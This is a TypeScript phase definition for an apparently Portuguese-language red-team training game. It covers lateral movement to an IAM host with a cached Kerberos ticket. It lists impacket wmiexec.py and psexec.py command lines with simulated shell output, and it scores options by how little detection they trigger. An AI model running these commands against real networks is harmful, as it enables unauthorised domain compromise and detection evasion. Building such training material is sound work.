import type { PhaseDefinition } from "./types";

export const phase10: PhaseDefinition = {
  number: 10,
  technicalName: "Lateral Movement",
  thematicName: "Movimento lateral para o host de aplicação IAM",
  objective:
    "Movimentar-se lateralmente ao host de aplicação IAM com o ticket S4U obtido, evitando técnicas ruidosas.",
  context: ds =>
    [
      `🚀 Hora de saltar. Você tem na cache um TGS em nome de administrator — agora é escolher para onde levar.`,
      `   O host ${ds.lateralHost.hostname} hospeda a aplicação IAM da operadora; pisar nele é uma escada direta`,
      `   para o próximo passo (DCSync).`,
      ``,
      `🎯 Duas técnicas clássicas competem aqui:`,
      `   • wmiexec.py → roda via DCOM/WMI, NÃO instala serviço, ruído menor`,
      `   • psexec.py  → eficaz, mas cria um serviço temporário (EID 7045) que blue teams adoram`,
      ``,
      `🤔 Não é uma decisão trivial. Você vai responder uma pergunta no fim: por que escolheu a sua?`,
      ``,
      `💡 A impacket tem ferramentas para os dois fluxos. Use Kerberos do cache (-k -no-pass) — você já tem o ticket.`
    ].join("\n"),
  expectedCommand: "wmiexec.py",
  acceptedCommands: ["psexec.py"],
  interpretationQuestion:
    "Você optaria por wmiexec ou psexec neste host? Justifique do ponto de vista de detecção (cite os eventos típicos gerados por cada técnica).",
  options: [
    {
      id: "a",
      text: "wmiexec.py -k -no-pass {dom}/administrator@{host}.{dom}",
      correct: true,
      response: ds =>
        [
          `[*] Using Kerberos ticket from cache (KRB5CCNAME)`,
          `[*] SMBv3.0 dialect used`,
          `[!] Launching semi-interactive shell on ${ds.lateralHost.hostname}`,
          `C:\\Windows\\system32> whoami`,
          `${ds.netbios}\\administrator`,
          ``,
          `[+] Sessão SYSTEM-equivalent obtida em ${ds.lateralHost.hostname}.`
        ].join("\n"),
      scoreDelta: 1.4,
      detectionDelta: 8,
      budgetDelta: -7,
      unlockEvidences: ds => [
        {
          label: "Shell em host IAM",
          payload: { host: ds.lateralHost.hostname, technique: "wmiexec + Kerberos" }
        }
      ],
      flag: ds => ds.flags.p10
    },
    {
      id: "b",
      text: "psexec.py -k -no-pass {dom}/administrator@{host}.{dom}",
      correct: true,
      alternativePath: true,
      response: ds =>
        [
          `[*] Requesting shares on ${ds.lateralHost.hostname}.....`,
          `[*] Found writable share ADMIN$`,
          `[*] Uploading file Sjk1.exe`,
          `[*] Creating service xZUM on ${ds.lateralHost.hostname}.....`,
          ``,
          `[!] Shell obtido, mas EID 7045 (instalação de serviço) acionado.`
        ].join("\n"),
      scoreDelta: 0.8,
      detectionDelta: 18,
      budgetDelta: -7,
      unlockEvidences: ds => [
        {
          label: "Shell em host IAM (psexec — ruidoso)",
          payload: { host: ds.lateralHost.hostname, technique: "psexec", noiseEvent: "EID 7045" }
        }
      ],
      flag: ds => ds.flags.p10
    },
    {
      id: "c",
      text: "Enter-PSSession -ComputerName {host}.{dom} -Authentication Kerberos",
      correct: false,
      alternativePath: true,
      response: ds =>
        `WinRM bloqueado por GPO em ${ds.lateralHost.hostname}. Tentativa falha e gera EID 6 do WinRM.`,
      scoreDelta: -0.2,
      detectionDelta: 8,
      budgetDelta: -3
    },
    {
      id: "d",
      text: "psexec.py -hashes :00000000000000000000000000000000 {dom}/administrator@<DC>",
      correct: false,
      response: () =>
        "Hash NTLM nulo é alvo de regras de detecção comuns. Falha e dispara alerta crítico.",
      scoreDelta: -0.6,
      detectionDelta: 25,
      budgetDelta: -6
    },
    {
      id: "e",
      text: "wmiexec.py {dom}/{user}:{pwd}@127.0.0.1",
      correct: false,
      response: () => "Movimentar-se contra localhost não tem efeito lateral.",
      scoreDelta: -0.3,
      detectionDelta: 3,
      budgetDelta: -3
    }
  ],
  techExplanation:
    "wmiexec usa DCOM/WMI sem criar serviço — detecção menor. psexec é eficaz porém cria serviço (7045) e SCM (7036). Ambas dependem de SMB/445 alcançável."
};
